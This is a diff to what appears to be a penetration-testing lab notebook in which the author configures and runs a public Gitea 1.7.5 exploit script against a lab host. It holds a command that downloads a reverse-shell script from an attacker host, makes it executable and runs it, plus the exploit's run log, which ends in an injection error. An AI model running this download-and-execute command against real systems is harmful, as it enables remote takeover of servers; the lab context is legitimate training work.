@@ -153,7 +153,50 @@ USERNAME = "hackme"
 PASSWORD = "hackme"
 HOST_ADDR = '192.168.52.67'
 HOST_PORT = 3000
-URL = 'http://ROQUEFORT:3000'
+URL = 'http://192.168.52.67:3000'
 CMD = 'wget http://192.168.49.52:8080/reverse.sh -O /tmp/reverse.sh && chmod 777 /tmp/reverse.sh && /tmp/reverse.sh'
+
+```
+
+
+we're using the wrong version.
+
+Gitea Version: 1.7.5
+
+wait, no. we are using the right version.
+
+not sure why it fails.
+
+```
+???(kali?kali)-[~]
+??$ python 49383.py   
+Logging in
+Logged in successfully
+Retrieving user ID
+Retrieved user ID: 1
+hint: Using 'master' as the name for the initial branch. This default branch name
+hint: will change to "main" in Git 3.0. To configure the initial branch name
+hint: to use in all of your new repositories, which will suppress this warning,
+hint: call:
+hint:
+hint:   git config --global init.defaultBranch <name>
+hint:
+hint: Names commonly chosen instead of 'master' are 'main', 'trunk' and
+hint: 'development'. The just-created branch can be renamed via this command:
+hint:
+hint:   git branch -m <name>
+hint:
+hint: Disable this message with "git config set advice.defaultBranchName false"
+Initialized empty Git repository in /tmp/tmp5c8ou7c5/.git/
+[master (root-commit) 2fd37cb] x
+ 1 file changed, 0 insertions(+), 0 deletions(-)
+ create mode 100644 x
+Cloning into bare repository '/tmp/tmp5c8ou7c5.git'...
+done.
+Created temporary git server to host /tmp/tmp5c8ou7c5.git
+Creating repository
+Repo "durkzwnp" created
+Injecting command into repo
+Error injecting command
 
 ```
